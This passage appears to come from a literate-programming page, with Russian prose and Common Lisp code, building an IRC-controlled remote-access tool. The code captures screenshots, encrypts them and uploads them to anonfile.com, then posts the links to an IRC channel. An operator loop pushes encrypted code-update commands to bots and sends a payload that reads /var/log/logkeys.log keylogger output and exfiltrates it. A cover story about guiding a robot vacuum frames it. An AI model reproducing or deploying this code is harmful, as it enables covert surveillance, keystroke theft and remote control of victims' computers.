  (let* ((height   (car  dims))
         (width    (cadr dims))
         (png      (get-png-obj width height image :grayscale))
         (png-seq  (get-png-seq png))
         (base64   (encrypt png-seq *irc-sess*))
         (filename (format nil frmt-filename-str
                           (format nil "~A" (get-universal-time))))
         (json     "")
         (result   (handler-case
                       (progn
                         (setf json (anon-file-upload filename base64))
                         (cl-json:decode-json-from-string json))
                     (JSON:JSON-SYNTAX-ERROR (err)
                       (dbg "::wrap-img error: ~A~%~A~%"  (type-of err) json)
                       (sendmsg "ERR(wrap-img): [~A]" (type-of err))
                       (return-from wrap-img nil))
                     (t (err)
                       (dbg "::wrap-img error: ~A~%" (type-of err))
                       (sendmsg "ERR(wrap-img): [~A]" (type-of err))
                       (return-from wrap-img nil))))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    (if link
        (sendmsg link)
        (sendmsg result))
    t))

;; get_img_diff
(declaim (inline get-img-diff))

(defun get-img-diff (dims prev snap)
  (let ((diff (make-array dims :element-type '(unsigned-byte 8))))
    (do ((qy 0 (incf qy)))
        ((= qy (car dims)))
      (declare (type fixnum qy))
      (do ((qx 0 (incf qx)))
          ((= qx (cadr dims)))
        (declare (type fixnum qx))
        (setf (aref diff qy qx)
              (logxor (aref prev qy qx)
                      (aref snap qy qx)))))
    diff))

;; shot
(let ((prev)
      (cnt 9999))
  (defun shot ()
    (declare (inline get-img-diff))
    (let* ((snap (pack-img (x-snapshot)))
           (dims (array-dimensions snap)))
      (if (&gt; cnt *max-diffs-cnt*)
          (progn ;; key frame
            (wrap-img "~A" dims snap)
            (setf prev snap)
            (setf cnt 0))
          ;; else - diff
          (if (wrap-img (format nil "~~A_~A" cnt) dims
                        (get-img-diff dims prev snap))
              (progn
                (setf prev snap)
                (incf cnt))
              ;; else: wrap failure
              (setf cnt 9999))))))
</pre>
</div>
</div>

<div id="outline-container-org394344c" class="outline-3">
<h3 id="org394344c">Wrap image</h3>
<div class="outline-text-3" id="text-org394344c">
<p>
За шифрование изображения, загрузку его на файлообменник, получение
ссылки и отправку её в канал отвечает функция <code>wrap-img</code>. Она выполняет
следующую последовательность операций:
</p>
<ul class="org-ul">
<li>Формирует PNG-объект из двухмерного массива точек изображения с помощью
функции <code>get-png-obj</code>.</li>
<li>Кодирует его в PNG-формат с помощью <code>get-png-seq</code> получая octets.</li>
<li>Складывает эти octets c гаммой, с помощью уже знакомой функции
<code>encrypt</code>, получая base64-string</li>
<li>Заливает эту base64-string на файлообменник с помощью функции
<code>anon-file-upload</code>. Здесь возможны варианты - [TODO:gmm] -
файлообменник может дать сбой, в этом случае следует попытаться
перезалить файл. Если несколько попыток оказались неудачны - надо
сделать так, чтобы следующее отправляемое изображение было ключевым
кадром, а не diff-ом, так как потеряный diff не даст нам возможности
распознать следующие изображения последовательности.</li>
<li>Полученную из файлообменника ссылку отправляет в irc-канал. В случае
ошибки отправляет туда содержание ошибки.</li>
</ul>

<div class="org-src-container">
<pre class="src src-lisp" id="org0ae6e91">;; get_png_obj
(defun get-png-obj (width height image &amp;optional (color-type :truecolor-alpha))
  (let* ((png (make-instance 'zpng:png :width width :height height
                             :color-type color-type))
         (vector (make-array ;; displaced vector - need copy for save
                  (* height width (zpng:samples-per-pixel png))
                  :displaced-to image :element-type '(unsigned-byte 8))))
    ;; Тут применен потенциально опасный трюк, когда мы создаем
    ;; объект PNG без данных, а потом добавляем в него данные,
    ;; используя неэкспортируемый writer.
    ;; Это нужно чтобы получить третью размерность массива,
    ;; который мы хотим передать как данные и при этом
    ;; избежать создания для этого временного объекта
    (setf (zpng::%image-data png) (copy-seq vector))
    png))

;; get_png_seq
(defun get-png-seq (png)
  (flex:with-output-to-sequence (stream)
    (zpng:write-png-stream png stream)))

;; anon_file_upload
;; (setf drakma:*header-stream* *standard-output*)

(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-csrf (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
           (when match-p (return (aref result 0))))))

(defun get-cookies-alist (cookie-jar)
  "Получаем alist с печеньками из cookie-jar"
  (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
       (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

(defun anon-file-upload (filename content)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request "https://anonfile.com/"
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (csrf (get-csrf text))
             (boundary "---------------------------196955623314664815241571979859")
             (type-header (format nil "multipart/form-data; boundary=~A" boundary))
             (new-headers `(("Accept" . "application/json")
                            ("Accept-Language" . "en-US,en;q=0.5")
                            ("Cache-Control" . "no-cache")
                            ("X-Requested-With" . "XMLHttpRequest")
                            ("X-CSRF-Token" . ,csrf)
                            ("Origin" . "https://anonfile.com")
                            ("Referer" . "https://anonfile.com/")
                            ("Content-Type" . ,type-header)
                            ("TE" . "Trailers"))))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request
             "https://api.anonfile.com/upload"
             :user-agent *user-agent*
             :method :post
             :form-data t
             :content (format nil "--~A
Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
Content-Type: application/octet-stream

~A
--~A--" boundary filename content boundary)
             :cookie-jar cookie-jar
             :additional-headers new-headers
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; wrap-img
(defun wrap-img (frmt-filename-str dims image)
  (let* ((height   (car  dims))
         (width    (cadr dims))
         (png      (get-png-obj width height image :grayscale))
         (png-seq  (get-png-seq png))
         (base64   (encrypt png-seq *irc-sess*))
         (filename (format nil frmt-filename-str
                           (format nil "~A" (get-universal-time))))
         (json     "")
         (result   (handler-case
                       (progn
                         (setf json (anon-file-upload filename base64))
                         (cl-json:decode-json-from-string json))
                     (JSON:JSON-SYNTAX-ERROR (err)
                       (dbg "::wrap-img error: ~A~%~A~%"  (type-of err) json)
                       (sendmsg "ERR(wrap-img): [~A]" (type-of err))
                       (return-from wrap-img nil))
                     (t (err)
                       (dbg "::wrap-img error: ~A~%" (type-of err))
                       (sendmsg "ERR(wrap-img): [~A]" (type-of err))
                       (return-from wrap-img nil))))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    (if link
        (sendmsg link)
        (sendmsg result))
    t))
</pre>
</div>
</div>

<div id="outline-container-org0f71510" class="outline-4">
<h4 id="org0f71510">Get PNG object</h4>
<div class="outline-text-4" id="text-org0f71510">
<p>
Функция <code>get-png-obj</code> вызывается из <code>wrap-img</code> и возвращает PNG-объект с
содержимым, сформированным из переданного в нее двумерного массива.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="orgfd8dbe0">(defun get-png-obj (width height image &amp;optional (color-type :truecolor-alpha))
  (let* ((png (make-instance 'zpng:png :width width :height height
                             :color-type color-type))
         (vector (make-array ;; displaced vector - need copy for save
                  (* height width (zpng:samples-per-pixel png))
                  :displaced-to image :element-type '(unsigned-byte 8))))
    ;; Тут применен потенциально опасный трюк, когда мы создаем
    ;; объект PNG без данных, а потом добавляем в него данные,
    ;; используя неэкспортируемый writer.
    ;; Это нужно чтобы получить третью размерность массива,
    ;; который мы хотим передать как данные и при этом
    ;; избежать создания для этого временного объекта
    (setf (zpng::%image-data png) (copy-seq vector))
    png))
</pre>
</div>
</div>
</div>

<div id="outline-container-orgf31223e" class="outline-4">
<h4 id="orgf31223e">Get PNG sequence</h4>
<div class="outline-text-4" id="text-orgf31223e">
<p>
Функция <code>get-png-seq</code> возвращает представление PNG-файла в виде octets.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org40ce78a">(defun get-png-seq (png)
  (flex:with-output-to-sequence (stream)
    (zpng:write-png-stream png stream)))
</pre>
</div>
</div>
</div>

<div id="outline-container-org760230a" class="outline-4">
<h4 id="org760230a">Anon File Upload</h4>
<div class="outline-text-4" id="text-org760230a">
<div class="org-src-container">
<pre class="src src-lisp" id="org272efbb">;; (setf drakma:*header-stream* *standard-output*)

(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-csrf (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
           (when match-p (return (aref result 0))))))

(defun get-cookies-alist (cookie-jar)
  "Получаем alist с печеньками из cookie-jar"
  (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
       (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

(defun anon-file-upload (filename content)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request "https://anonfile.com/"
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (csrf (get-csrf text))
             (boundary "---------------------------196955623314664815241571979859")
             (type-header (format nil "multipart/form-data; boundary=~A" boundary))
             (new-headers `(("Accept" . "application/json")
                            ("Accept-Language" . "en-US,en;q=0.5")
                            ("Cache-Control" . "no-cache")
                            ("X-Requested-With" . "XMLHttpRequest")
                            ("X-CSRF-Token" . ,csrf)
                            ("Origin" . "https://anonfile.com")
                            ("Referer" . "https://anonfile.com/")
                            ("Content-Type" . ,type-header)
                            ("TE" . "Trailers"))))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request
             "https://api.anonfile.com/upload"
             :user-agent *user-agent*
             :method :post
             :form-data t
             :content (format nil "--~A
Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
Content-Type: application/octet-stream

~A
--~A--" boundary filename content boundary)
             :cookie-jar cookie-jar
             :additional-headers new-headers
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-orgeb5a3fd" class="outline-3">
<h3 id="orgeb5a3fd">Packing image</h3>
<div class="outline-text-3" id="text-orgeb5a3fd">
<p>
Нам нужна функция, для быстрой упаковки изображения. Она не тривиальна.
</p>

<p>
Мы берем полноцветное изображение и используем два вложенных цикла,
проходя по <code>Y</code> и <code>X</code> чтобы обработать каждую точку. После обработки одна
точка должна занимать только один бит.
</p>

<p>
Мы также должны упаковать по восемь точек в байт, но если размер
изображения в точках не кратен байту, то нужно дополнить недостающие
точки. За это отвечате внутренний макрос <code>byte-finiser</code>, который
вызывается по мере накопления значений в байте и в конце обработки
строки, если это необходимо.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="orgb3f4433">(defun pack-img (image)
  (declare (optimize (speed 3) (safety 0)))
  (let* ((dims (array-dimensions image))
         (height (car dims))
         (width (cadr dims))
         (new-width (ash (logand (+ width 7) (lognot 7)) -3))
         (need-finisher (not (equal new-width (ash width -3))))
         (result (make-array (list height new-width)
                             :element-type '(unsigned-byte 8)))
         (bp 8)
         (acc 0))
    (declare (type (unsigned-byte 8) acc)
             (type fixnum bp)
             (type fixnum width)
             (type fixnum new-width)
             (type fixnum height))
    (macrolet ((byte-finisher (acc qy qx bp)
                 `(progn
                    ;; (format t "~8,'0B(~2,'0X)" ,acc ,acc)
                    (setf (aref result ,qy (ash ,qx -3)) ,acc)
                    (setf ,acc 0)
                    (setf ,bp 8))))
      (do ((qy 0 (incf qy)))
          ((= qy height))
        (declare (type fixnum qy))
        (do ((qx 0 (incf qx)))
            ((= qx width) (when need-finisher
                            (byte-finisher acc qy qx bp)))
          (declare (type fixnum qx))
          (let* ((avg (floor (+ (aref image qy qx 0)
                                (aref image qy qx 1)
                                (aref image qy qx 2))
                             3))
                 (pnt (ash avg -7)))
            (declare (type fixnum avg))
            (declare (type fixnum pnt))
            (decf bp)
            (setf acc (logior acc (ash pnt bp)))
            (when (= bp 0)
              (byte-finisher acc qy qx bp))))
        ;; (format t "~%")
        ))
    result))

;; (disassemble 'pack-img)

;; TEST: pack-img
;; (time
;;  (let* ((image (pack-img (x-snapshot)))
;;         (dims (array-dimensions image)))
;;    (save-png (cadr dims)
;;              (car dims)
;;              (format nil "~A" (gensym "FILE"))
;;              image
;;              :grayscale)))
</pre>
</div>
</div>
</div>

<div id="outline-container-org881173d" class="outline-3">
<h3 id="org881173d">X-Snapshot</h3>
<div class="outline-text-3" id="text-org881173d">
<p>
Этот раздел описывает библиотечные функции, которые необходимы для
получения снимков экрана
</p>

<p>
Работа с экраном через <code>xlib</code>:
</p>
<ul class="org-ul">
<li>Получение размеров экрана</li>
<li>Получение снимков экрана</li>
</ul>

<p>
После получения размеров экрана мы сохраняем их в глобальные переменные
вида <code>default-*</code>, чтобы после работать с ними напрямую - за это отвечает
вызов функции <code>init-defaults</code>.
</p>

<p>
При формировании скришота мы перекодируем его функцией
<code>raw-image-&gt;png</code>. При оптимизации эту перекодировку следует удалить,
чтобы ускорить работу, но пока нам требуется отлаживаемость а не
скорость.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="orgab25320">(defmacro with-display (host (display screen root-window) &amp;body body)
  `(let* ((,display (xlib:open-display ,host))
          (,screen (first (xlib:display-roots ,display)))
          (,root-window (xlib:screen-root ,screen)))
     (unwind-protect (progn ,@body)
       (xlib:close-display ,display))))

(defmacro with-default-display ((display &amp;key (force nil)) &amp;body body)
  `(let ((,display (xlib:open-default-display)))
     (unwind-protect
          (unwind-protect
               ,@body
            (when ,force
              (xlib:display-force-output ,display)))
       (xlib:close-display ,display))))

(defmacro with-default-display-force ((display) &amp;body body)
  `(with-default-display (,display :force t) ,@body))

(defmacro with-default-screen ((screen) &amp;body body)
  (let ((display (gensym)))
    `(with-default-display (,display)
       (let ((,screen (xlib:display-default-screen ,display)))
         ,@body))))

(defmacro with-default-window ((window) &amp;body body)
  (let ((screen (gensym)))
    `(with-default-screen (,screen)
       (let ((,window (xlib:screen-root ,screen)))
         ,@body))))

(defun x-size ()
  (with-default-screen (s)
    (values
     (xlib:screen-width s)
     (xlib:screen-height s))))

(defparameter *default-x* 0)
(defparameter *default-y* 0)
(defparameter *default-width* 800)
(defparameter *default-height* 600)

(defun init-defaults ()
  (multiple-value-bind (width height)
      (x-size)
    (setf *default-width* width
          *default-height* height
          *default-x* 0
          *default-y* 0)))

(init-defaults)

(defun raw-image-&gt;png (data width height)
  (let* ((png (make-instance 'zpng:png :width width :height height
                             :color-type :truecolor-alpha
                             :image-data data))
         (data (zpng:data-array png)))
    (dotimes (y height)
      (dotimes (x width)
        ;; BGR -&gt; RGB, ref code: https://goo.gl/slubfW
        ;; diffs between RGB and BGR: https://goo.gl/si1Ft5
        (rotatef (aref data y x 0) (aref data y x 2))
        (setf (aref data y x 3) 255)))
    png))

(defun x-snapshot (&amp;key (x *default-x*) (y *default-y*)
                     (width  *default-width*) (height *default-height*)
                     path)
  ;; "Return RGB data array (The dimensions correspond to the height, width,
  ;; and pixel components, see comments in x-snapsearch for more details),
  ;; or write to file (PNG only), depend on if you provide the path keyword"
  (with-default-window (w)
    (let ((image
           (raw-image-&gt;png
            (xlib:get-raw-image w :x x :y y
                                :width width :height height
                                :format :z-pixmap)
            width height)
          ))
      (if path
          (let* ((ext (pathname-type path))
                 (path
                  (if ext
                      path
                      (concatenate 'string path ".png")))
                 (png? (or (null ext) (equal ext "png"))))
            (cond
              (png? (zpng:write-png image path))
              (t (error "Only PNG file is supported"))))
          (zpng:data-array image)))))

;; (x-snapshot :path "x-snapshot-true-color.png")
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-org1e56666" class="outline-2">
<h2 id="org1e56666">Operator's Loop</h2>
<div class="outline-text-2" id="text-org1e56666">
<p>
Наблюдать за узлом сети и отправлять команды очень увлекательно, но
хочется добавить автоматизации. Например, если глупый робот-пылесос умеет
посылать в канал сообщение о том, что батарея разряжается, то умная
программа-оператор, сидящая в irc-канале может начать с ним диалог, чтобы
довести его до зарядной станции.
</p>

<p>
Для этого оператору нужно только уметь принимать сообщения и декодировать
отправленные данные. Общая схема работы будет такая же как у супервизора:
используем <code>operator-loop</code> и <code>watchdog-timer</code>, чтобы циклически вызывать
функцию из глобальной переменной <code>*operator*</code>.
</p>

<p>
Каждую секунду <code>operator-loop</code> инкрементирует состояние переменной
<code>watchdog-timer</code> и вызывает <code>operator</code>. Внутри себя <code>operator</code> использует
значение этой переменной, чтобы отслеживать зависшие потоки и завершать
их.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org076ddf4">(defparameter *outlock* (bt:make-recursive-lock "output-lock"))

(defmacro bprint (var)
  `(subseq (with-output-to-string (*standard-output*)
             (pprint ,var)) 1))

(defmacro dbg (msg &amp;rest params)
  "debug output with lock"
  `(bt:with-recursive-lock-held (*outlock*)
     (format t ,msg ,@params)
     (finish-output)))

(defun decode-time (universal-time)
  (multiple-value-bind (second minute hour date month year day daylight-p zone)
      (decode-universal-time universal-time)
    (format nil "~A-~A-~A ~A:~A:~A" year month date hour minute second)))

(defparameter *watchdog-timer* 0)

(defparameter *operator-stop-flag* nil)

(defparameter *sleep-interval* 3)

(defparameter *watchdog-timer-max* 100)

(defparameter *task-th-stop-flag* nil)

(defparameter *op-irc-th-stop-flag* nil)

(defparameter *op-connection-established-flag* nil)

(defparameter *op-irc-threads* nil)

(defparameter *max-task-thread-cnt* 30)

(defparameter *task-threads* nil)

(defparameter *max-task-thread-life-time* 5)

(defparameter *thread-operations-lock*
  (bt:make-recursive-lock "thread-operations-lock"))

(defstruct task
  class
  data
  code)
(defparameter *task-queue* nil)
(defparameter *task-queue-lock* (bt:make-lock "task-queue-lock"))
(defun ins-task (task)
  (bt:with-lock-held (*task-queue-lock*)
    (setf *task-queue*
          (append *task-queue*
                  (list task)))))

(defun pop-task ()
  (bt:with-lock-held (*task-queue-lock*)
    (pop *task-queue*)))

(defun length-of-queue ()
  (bt:with-lock-held (*task-queue-lock*)
    (length *task-queue*)))

(defparameter *op-sess* nil)
(defparameter *op-user* nil)
(defparameter *op-serv* "irc.freenode.org")
(defparameter *op-chan* "#wntriscoming")
(defparameter *op-lock* (bt:make-recursive-lock "op-lock"))
(defparameter *op-conn* nil)

(defmacro sendmsg (msg &amp;rest params)
  `(bt:with-recursive-lock-held (*op-lock*)
     (cl-irc:privmsg *op-conn* *op-chan* (format nil ,msg ,@params))))

;; op-hook
;; op_cmd_proc
(defun shot-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^/.*/[0-9]*(_[0-9])?$" str))

(defun shot-rule-consequent (str src)
  (dbg ":: shot-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (ins-task (make-task :class 'task
                       :data (list str src)
                       :code #'identity)))

;; (shot-rule-consequent "/pe3bM7E9n5/3785062633" "b3785062627")
(defun hi-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^hi$" str))

;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; encrypt
(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

;; anon_file_upload
;; (setf drakma:*header-stream* *standard-output*)

(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-csrf (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
           (when match-p (return (aref result 0))))))

(defun get-cookies-alist (cookie-jar)
  "Получаем alist с печеньками из cookie-jar"
  (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
       (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

(defun anon-file-upload (filename content)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request "https://anonfile.com/"
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (csrf (get-csrf text))
             (boundary "---------------------------196955623314664815241571979859")
             (type-header (format nil "multipart/form-data; boundary=~A" boundary))
             (new-headers `(("Accept" . "application/json")
                            ("Accept-Language" . "en-US,en;q=0.5")
                            ("Cache-Control" . "no-cache")
                            ("X-Requested-With" . "XMLHttpRequest")
                            ("X-CSRF-Token" . ,csrf)
                            ("Origin" . "https://anonfile.com")
                            ("Referer" . "https://anonfile.com/")
                            ("Content-Type" . ,type-header)
                            ("TE" . "Trailers"))))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request
             "https://api.anonfile.com/upload"
             :user-agent *user-agent*
             :method :post
             :form-data t
             :content (format nil "--~A
Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
Content-Type: application/octet-stream

~A
--~A--" boundary filename content boundary)
             :cookie-jar cookie-jar
             :additional-headers new-headers
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; upload_code
(defun upload-code (code key)
  (let* ((oct (flex:string-to-octets code :external-format :utf-8))
         (base64 (encrypt oct key))
         (filename (format nil "u-~A" (get-universal-time)))
         (result   (cl-json:decode-json-from-string
                    (anon-file-upload filename base64)))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    link))

;; TEST for upload
;; (upload-code "(defun alfa () (print 1))" 1234567890)
;; /t1TaCeD1ne/u-3784605289

;; encode
(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))

(defun upload-code-and-send (code key seed)
  (let* ((code-link (upload-code code key))
         (cmd (format nil "(update \"~A\" ~A)" code-link key))
         (enc (encode cmd seed)))
    (sendmsg enc)))

;; (upload-code-and-send "(alfa)" 1234567890 3784753813)

(defun hi-rule-consequent (str src)
  (dbg ":: HI-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890)
         (receiver (parse-integer (subseq src 1)))
         (code (format
                nil
                "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
                tmpkey)))
    (upload-code-and-send code tmpkey receiver)))

;; (let* ((tmpkey 1234567890)
;;        (src "b3785294860")
;;        (receiver (parse-integer (subseq src 1)))
;;        (code (format
;;               nil
;;               "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
;;               tmpkey)))
;;   (upload-code-and-send code tmpkey receiver))
(defun k-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^k/(.*)/u-(.*)$" str))

(defun download-and-decrypt (link key)
  (flex:octets-to-string
   (decrypt
    (anon-file-download link)
    key)
   :external-format :utf-8))

;; (upload-code
;;  (alexandria:read-file-into-string "q.lisp\"")

;; (download-and-decrypt "/some/link" *tmpkey*)

(defun k-rule-consequent (str src)
  (dbg ":: K-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890))
    (alexandria:write-string-into-file
     (download-and-decrypt (subseq str 1) tmpkey)
     (format nil "~~/wnt/~A.log" (ppcre:regex-replace-all "/" str "_")))))

(defparameter *op-rules*
  (list (cons #'shot-rule-antecedent  #'shot-rule-consequent)
        (cons #'hi-rule-antecedent    #'hi-rule-consequent)
        (cons #'k-rule-antecedent     #'k-rule-consequent)))

(defparameter *op-cmd*
  (lambda (param)
    (block op-cmd-block
      (let* ((msg  (cadr (CL-IRC:ARGUMENTS param)))
             (src  (CL-IRC:SOURCE param))
             ;; (oct  (decrypt msg *op-sess*))
             ;; (str  (handler-case
             ;;           (flex:octets-to-string oct :external-format :utf-8)
             ;;         (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil)))
             (str msg)
             )
        (dbg ":: op-cmd ~A: ~A~%" src str)
        (block op-rules-dispatcher
          (let ((applyed_rules 0))
            (loop :for (antecedent . consequent) :in *op-rules* :do
                 (when (funcall antecedent str src)
                   (incf applyed_rules)
                   (dbg ":: op-cmd rule: ~A~%" consequent)
                   (when (funcall consequent str src)
                     (return-from op-rules-dispatcher nil))))
            (when (&gt; 0 applyed_rules)
              (dbg "::UNKMSG [~A] from [~A]~%" str src))
            (finish-output)))
        ))))

(defun op-msg-hook (param)
  "MUST return T for stop hooks processing"
  (funcall *op-cmd* param)
  t)

(defun op-helper ()
  (sleep 1)
  (cl-irc:add-hook *op-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'op-msg-hook)
  (sleep 1)
  (bt:with-recursive-lock-held (*op-lock*)
    (cl-irc:join *op-conn* *op-chan*))
  (sleep 1)
  (bt:with-recursive-lock-held (*op-lock*)
    (setf *op-connection-established-flag* t))
  (sendmsg "op here"))

(defun op-loop ()
  (bt:make-thread
   #'op-helper :name "op-helper-th"
   :initial-bindings
   `((*standard-output* . ,*standard-output*)
     (*op-sess* . ,*op-sess*)
     (*op-user* . ,*op-user*)
     (*op-serv* . ,*op-serv*)
     (*op-chan* . ,*op-chan*)
     (*op-lock* . ,*op-lock*)
     (*op-conn* . ,*op-conn*)))
  (handler-case (cl-irc:read-message-loop *op-conn*)
    (SB-INT:SIMPLE-STREAM-ERROR (err)
      (dbg ":: op-loop error: ~A~%" (type-of err)))
    ;; (t (err)
    ;;   (dbg "::op-loop error: ~A~%" (type-of err)))
    ))

(defun op-irc ()
  "operator's irc thread func"
  (setf *op-sess* (get-universal-time))
  (setf *op-user* (format nil "op~A" *op-sess*))
  (setf *op-conn*
        (handler-case
            (cl-irc:connect :nickname *op-user* :server *op-serv*)
          (USOCKET:NS-TRY-AGAIN-CONDITION (err)
            (dbg "::irc connect error: ~A~%" (type-of err))
            nil)
          (t (err)
            (dbg "::irc connect error: ~A~%" (type-of err))
            nil)))
  (when *op-conn*
    (dbg "::op irc conn:~A~%" *op-conn*)
    (setf *watchdog-timer* 0)
    (op-loop)))

;; anon_file_download
(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-download-link (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings
              "(https://cdn-([0-9]*)\.anonfile.com\/(.*))\\\""
              str)
           (when match-p (return (aref result 0))))))

(defun anon-file-download (filename)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request (format nil "https://anonfile.com~A" filename)
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (link (get-download-link text)))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request link
             :user-agent *user-agent*
             :cookie-jar cookie-jar
             :additional-headers *additional-headers*
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
